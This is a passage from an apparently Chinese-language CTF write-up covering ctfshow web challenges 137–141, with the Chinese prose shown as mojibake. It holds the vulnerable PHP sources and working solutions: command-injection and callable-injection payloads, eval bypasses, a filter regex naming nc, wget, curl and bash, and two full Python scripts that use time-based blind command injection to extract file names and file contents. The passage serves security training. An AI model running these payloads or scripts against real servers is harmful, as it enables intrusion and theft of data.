<p><img alt="image-20250124152140227" loading="lazy" src="assets/image-20250124152140227.png"></p>
<p>çœ‹åˆ°flagçš„ä½ç½®</p>
<pre tabindex="0"><code>?c=cat /f149_15_h3r3|tee 2
</code></pre><p><img alt="image-20250124152240505" loading="lazy" src="assets/image-20250124152240505.png"></p>
<h4 id="web137">web137<a hidden class="anchor" aria-hidden="true" href="#web137">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-16 22:27:49
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p><img alt="image-20250124162118373" loading="lazy" src="assets/image-20250124162118373.png"></p>
<p>æˆ‘ä»¬éœ€è¦é€šè¿‡postä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„ä¸­åŒ…å«ç±»åå’Œæ–¹æ³•å</p>
<p>payload</p>
<pre tabindex="0"><code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag
</code></pre><p>åˆæˆ–è€…</p>
<pre tabindex="0"><code>ctfshow=ctfshow::getFlag
</code></pre><h4 id="web138">web138<a hidden class="anchor" aria-hidden="true" href="#web138">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-16 22:52:13
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private class&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">getFlag</span><span class="p">(){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">strripos</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">],</span> <span class="s2">&#34;:&#34;</span><span class="p">)</span><span class="o">&gt;-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;private function&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]);</span>
</span></span></code></pre></div><p>è¿™é“é¢˜é™åˆ¶äº†ä¸Šä¸€é¢˜çš„ç¬¬äºŒç§è§£æ³•</p>
<p>ç¬¬ä¸€ç§è¿˜èƒ½ç»§ç»­ä½¿ç”¨</p>
<p>payload:</p>
<pre tabindex="0"><code>ctfshow[]=ctfshow&amp;ctfshow[]=getFlag
ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag
</code></pre><h4 id="web139">web139<a hidden class="anchor" aria-hidden="true" href="#web139">#</a></h4>
<pre tabindex="0"><code>&lt;?php
error_reporting(0);
function check($x){
    if(preg_match(&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\{|\}|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;, $x)){
        die(&#39;too young too simple sometimes naive!&#39;);
    }
}
if(isset($_GET[&#39;c&#39;])){
    $c=$_GET[&#39;c&#39;];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?&gt;
</code></pre><p>è¿™é¢˜çœ‹ç€å’Œå‰é¢é‚£é¢˜æ˜¯ä¸€æ ·çš„</p>
<p>ä½†å®é™…ä¸Šæ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™</p>
<p>è¿™é¢˜å¯ä»¥é€šè¿‡æ—¶é—´ç›²æ³¨æ”»å‡»è·å–æ–‡ä»¶åå·²ç»æ–‡ä»¶ä¸­çš„å­—ç¬¦ç­‰</p>
<p>æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">+</span> <span class="s2">&#34;{&#34;</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span> <span class="o">+</span> <span class="s2">&#34;_&#34;</span> <span class="o">+</span> <span class="s2">&#34;~&#34;</span>    <span class="c1"># æ„å»ºä¸€ä¸ªåŒ…å«æ‰€æœ‰å­—æ¯å’Œæ•°å­—ä»¥åŠéƒ¨åˆ†ç¬¦å·çš„å­—ç¬¦ä¸²ï¼Œç¬¦å·å¯ä»¥è‡ªå·±åŠ </span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>          <span class="c1"># åˆå§‹åŒ–ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ï¼Œç”¨äºä¿å­˜ç»“æœ</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">#è·å–å¤šå°‘è¡Œ</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span>   <span class="c1">#ç”¨äºæ§åˆ¶å†…å±‚å¾ªç¯(j)çš„ç»“æŸ</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="c1">#ä¸breakçš„æƒ…å†µä¸‹ï¼Œä¸€è¡Œæœ€å¤šå‡ ä¸ªå­—ç¬¦</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>       <span class="c1">#nå°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„è¿”å›å€¼</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;if [ `ls /|awk &#39;NR==</span><span class="si">{0}</span><span class="s2">&#39;|cut -c </span><span class="si">{1}</span><span class="s2">` == </span><span class="si">{2}</span><span class="s2"> ];then sleep 3;fi&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>   <span class="c1">#{n}æ˜¯å ä½ç¬¦</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="c1">#print(payload)</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=&#34;</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="p">(</span><span class="mf">2.5</span><span class="p">,</span> <span class="mf">2.5</span><span class="p">))</span>   <span class="c1">#è®¾ç½®è¶…æ—¶æ—¶é—´ä¸º 2.5 ç§’,åŒ…æ‹¬è¿æ¥è¶…æ—¶å’Œè¯»å–è¶…æ—¶ï¼Œè¶…æ—¶å°±æ˜¯ä¹‹å‰sleep 3äº†ã€‚</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="c1"># å¦‚æœè¯·æ±‚å‘ç”Ÿå¼‚å¸¸ï¼Œè¡¨ç¤ºæ¡ä»¶æ»¡è¶³ï¼Œå°†å½“å‰å­—ç¬¦ n æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ï¼Œå¹¶ç»“æŸå½“å‰å†…å±‚å¾ªç¯</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">n</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="s1">&#39;~&#39;</span><span class="p">:</span>    <span class="c1">#strçš„æœ€åä¸€ä½ï¼Œâ€œ~â€ä¸å¸¸å‡ºç°ï¼Œç”¨ä½œç»“å°¾</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="n">key</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">                
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="c1"># åœ¨æ¯æ¬¡è·å–ä¸€ä¸ªå­—ç¬¦åï¼Œå°†ä¸€ä¸ªç©ºæ ¼æ·»åŠ åˆ°ç»“æœå­—ç¬¦ä¸²ä¸­ï¼Œç”¨äºåˆ†éš”ç»“æœçš„ä¸åŒä½ç½®</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34; &#34;</span>
</span></span></code></pre></div><p>è¿™ä¸ªè„šæœ¬çš„åŸç†å…¶å®å°±æ˜¯ï¼Œé€šè¿‡shellç¼–ç¨‹ä¸­çš„ifè¯­å¥åˆ¤æ–­</p>
<pre tabindex="0"><code>ls /|awk &#39;NR=={0}&#39;|cut -c {1}
</code></pre><p>ä¸­æˆªå–åˆ°çš„å­—ç¬¦ä¸²æ˜¯å¦ä¸æˆ‘ä»¬éå†çš„ä»»ä¸€ä¸ªå­—ç¬¦åŒ¹é…ï¼Œè‹¥åŒ¹é…æˆåŠŸåˆ™ä½¿ç”¨sleepå‘½ä»¤ä½¿å“åº”æ—¶é—´å˜ä¸º3s</p>
<p>è€Œè„šæœ¬é€šè¿‡åˆ¤æ–­å“åº”æ—¶é—´å³å¯çŸ¥é“æˆªå–åˆ°çš„å­—ç¬¦æ˜¯å¦åŒ¹é…ï¼Œä»è€Œä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çš„è·å–</p>
<p><img alt="image-20250124171223602" loading="lazy" src="assets/image-20250124171223602.png"></p>
<p>è¯»åˆ°flagçš„ä½ç½®ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»æ–‡ä»¶äº†ï¼ŒåŸç†ä¸€æ ·</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="o">+</span><span class="s2">&#34;-&#34;</span><span class="o">+</span><span class="s2">&#34;{&#34;</span><span class="o">+</span><span class="s2">&#34;}&#34;</span>    
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>          
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span>   
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>      
</span></span><span class="line"><span class="ln">14</span><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;if [ `cat /f149_15_h3r3|awk &#39;NR==</span><span class="si">{0}</span><span class="s2">&#39;|cut -c </span><span class="si">{1}</span><span class="s2">` == </span><span class="si">{2}</span><span class="s2"> ];then sleep 3;fi&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>   
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="c1">#print(payload)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=&#34;</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="p">(</span><span class="mf">2.5</span><span class="p">,</span> <span class="mf">2.5</span><span class="p">))</span>   
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">n</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">                
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34; &#34;</span>
</span></span></code></pre></div><p><img alt="image-20250124180128116" loading="lazy" src="assets/image-20250124180128116.png"></p>
<h4 id="web140">web140<a hidden class="anchor" aria-hidden="true" href="#web140">#</a></h4>
<p>å‡½æ•°çš„åˆ©ç”¨</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 12:39:25
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$f1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$f2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$f1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$f2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span> <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$f1</span><span class="s2">(</span><span class="si">$f2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><a href="https://ctf.show/writeups/743106">åŸæ–‡</a></p>
<p>éœ€è¦<code>$f1($f2());</code>çš„è¿”å›å€¼ï¼Œæˆ–è€…æ˜¯å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œæˆ–è€…æ˜¯ç©ºæ•°ç»„ï¼Œæˆ–è€…å°±æ˜¯0ï¼Œæˆ–è€…FLASEã€‚</p>
<p><strong>payload1</strong>ï¼š system(system())&mdash;&gt; <code>f1=system&amp;f2=system</code></p>
<p><code>string system( string $command[, int &amp;$return_var] )</code>ï¼šæˆåŠŸåˆ™è¿”å›å‘½ä»¤è¾“å‡ºçš„æœ€åä¸€è¡Œï¼Œå¤±è´¥åˆ™è¿”å› FALSE ã€‚system()å¿…é¡»åŒ…å«å‚æ•°ï¼Œå¤±è´¥è¿”å›FLASEï¼›system(&lsquo;FLASE&rsquo;)ï¼Œç©ºæŒ‡ä»¤ï¼Œå¤±è´¥è¿”å›FLASEã€‚</p>
<p><strong>payload2</strong>ï¼š usleep(usleep())&mdash;&gt; <code>f1=usleep&amp;f2=usleep</code> usleepæ²¡æœ‰è¿”å›å€¼ã€‚ æ‰€ä»¥intvalå‚æ•°ä¸ºç©ºï¼Œå¤±è´¥è¿”å›0</p>
<p><strong>payload3</strong>ï¼š getdate(getdate())&mdash;&gt; <code>f1=getdate&amp;f2=getdate</code></p>
<p><code>array getdate([ int $timestamp = time()] )</code>ï¼šè¿”å›ç»“æœæ˜¯arrayï¼Œå‚æ•°å¿…é¡»æ˜¯intå‹ã€‚æ‰€ä»¥getdate(getdate())&mdash;-&gt;getdate(arrayå‹)&mdash;&gt;å¤±è´¥è¿”å›flaseï¼Œintvalä¸º0ã€‚</p>
<h4 id="web141">web141<a hidden class="anchor" aria-hidden="true" href="#web141">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 19:28:09
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1">#error_reporting(0);
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
